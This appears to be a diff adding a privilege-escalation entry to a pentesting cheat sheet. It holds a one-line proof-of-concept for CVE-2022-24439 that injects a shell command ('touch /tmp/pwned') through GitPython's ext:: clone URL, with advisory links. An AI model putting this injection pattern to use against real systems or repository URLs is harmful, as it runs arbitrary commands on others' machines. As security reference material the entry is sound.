@@ -27,3 +27,17 @@ curl -s -q -X 'POST' <url> \
       -H 'Connection: close' \
       -H 'Referer: <referer>' \
 ```
+
+# PrivEsc
+
+## Git
+
+#### CVE-2022-24439:
+
+```
+<gitpython::clone> 'ext::sh -c touch% /tmp/pwned'
+```
+
+- https://git-scm.com/docs/git-remote-ext
+- https://github.com/gitpython-developers/GitPython/issues/1515
+- https://security.snyk.io/vuln/SNYK-PYTHON-GITPYTHON-3113858
